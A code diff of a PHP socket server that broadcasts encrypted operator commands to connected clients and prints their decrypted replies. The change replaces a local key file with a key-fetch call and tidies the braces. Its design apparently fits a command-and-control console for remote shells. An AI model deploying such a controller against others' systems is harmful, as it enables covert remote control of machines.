@@ -27,19 +27,17 @@
 	(socket_listen($master_sock))
 	or die("[\33[91m!\33[0m] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
 	
-	if(!file_exists('.success')){
-		$key = base64_encode(openssl_random_pseudo_bytes(32));
-		file_put_contents('.success', $key);
 
-		// TODO:send key
-
-	} else {
-		$key = file_get_contents(".success");
-	}
 	require_once 'Openssl_EncryptDecrypt.php';
 	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
-	define('ENCRYPTION_KEY', base64_decode($key));
+	
+	if(($key = $openssl_encrypt_decrypt->fetch_key()) !== false){
+		define('ENCRYPTION_KEY', $key);
+	} else {
+		die('!! failed to fetch key.');
+	}
 
+	
 	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
 	
 	$clients = array($master_sock);
@@ -52,15 +50,13 @@
 		$except = NULL;
 		$now = date('H:i:s');
 
-	    if(! socket_select($recv, $write, $except, NULL))
-	    {
+	    if(! socket_select($recv, $write, $except, NULL)){
 	    	die("\33[91m[!] socket_select() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
 	    }
 
 	    if(in_array($master_sock, $recv))
 	    {
-			if (! ($clients[] = $recv_sock = socket_accept($master_sock)))
-			{
+			if (! ($clients[] = $recv_sock = socket_accept($master_sock))) {
 		        die("\33[91m[!] socket_accept() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
 		    }
 
@@ -91,8 +87,7 @@
 	        	echo "\33[94mBytes recieved: ".$bytes."\33[0m\n";
         	  	$lastError = socket_last_error($recv_sock);
 
-			    if($bytes === 0)
-			    {		
+			    if($bytes === 0){		
 					if($lastError !== 0){
 						echo "Error: ".$lastError." :: ".socket_strerror($lastError)."\n";
 					}
@@ -111,8 +106,7 @@
 			    else if (intval($bytes) > 0) {
 			        $data .= $buffer;
 			    }
-			    else
-			    {
+			    else {
 		           	echo $lastError !== 0 ? "No data\nError: ".$lastError." :: ".socket_strerror($lastError)."\n" : "";
 			    }
 	        }
@@ -120,19 +114,14 @@
 			if($all_bytes < 4096){
 				echo "\33[95mOverall bytes recieved: ".$all_bytes."\33[0m\n";
 			}
-
-	        if($data !== "")
-	        {
+	        if($data !== ""){
 				$data = $openssl_encrypt_decrypt->decrypt_cbc($data, ENCRYPTION_KEY);
 
 		    	echo "[".$now."] Client [\33[36m".$ip.":".$port."\33[0m]\n".DELIMITER."\n".$data."\n".DELIMITER."\n";
 	        }
-
 		}
-
 		$line = readline(">>> ");
-		if($line !== "")
-		{
+		if($line !== ""){
 			readline_add_history($line);
 		}
 
@@ -148,27 +137,24 @@
 				fclose($fp);
 				$full_cmd = "";
 				
-				foreach ($cmdsarr as $cmd)
-				{
+				foreach ($cmdsarr as $cmd){
 					$full_cmd .= trim($cmd);
 				}
-				$full_cmd = $openssl_encrypt_decrypt->encrypt_cbc($full_cmd, ENCRYPTION_KEY);
 
+				$full_cmd = $openssl_encrypt_decrypt->encrypt_cbc($full_cmd, ENCRYPTION_KEY);
 
 				foreach ($write as $send_sock)
 		  		{
-			        if($send_sock == $master_sock)
+			        if($send_sock == $master_sock){
 			            continue;
-
-			        else if(! @socket_write($send_sock, $full_cmd."\n", strlen($full_cmd)))
-			        {	
+					}
+			        else if(! @socket_write($send_sock, $full_cmd."\n", strlen($full_cmd))){	
 			        	echo "[\33[91mWrite error\33[0m]: ".socket_strerror(socket_last_error($send_sock))."\n";
 			        }	
 		    	}
 				continue;
 			}
-			else 
-			{
+			else {
 				echo "Invalid path.\n";
 				continue;
 			}
@@ -191,35 +177,29 @@
 	    		break;
 	    }
 
-		if(!empty($connected_clients) && !empty($write))
-		{
+		if(!empty($connected_clients) && !empty($write)){
 		    if(!empty($line) 
 		    	&& $line != 'clients'
 				&& $line != 'exit')
 		    {
 				$line = $openssl_encrypt_decrypt->encrypt_cbc($line, ENCRYPTION_KEY);
-
-			  	foreach ($write as $send_sock)
-			  	{
-			        if($send_sock == $master_sock)
-			            continue;
-
-			        else if(! @socket_write($send_sock, $line."\n", strlen($line)))
-			        {	
+				foreach ($write as $send_sock)
+				{
+			        if($send_sock == $master_sock){
+						continue;
+					}
+					else if(! @socket_write($send_sock, $line."\n", strlen($line))){
 			        	echo "\33[91m[Write error\33[0m]: ".socket_strerror(socket_last_error($send_sock))."\n";
-			        }	
+			        }
 			    }
 			    sleep(1); // wait for response
 			}
 		}
-
-		if(count($clients) === 1)	// only master socket => no clients
-		{
+		if(count($clients) === 1){	// only master socket => no client{
 			echo "[\33[91mNo connected clients\33[0m]: Listening..\n";
 			$line = "";
 		}
 	}
-
 	echo "Closing master socket..\n";
 	socket_close($master_sock);
 	exit(0);
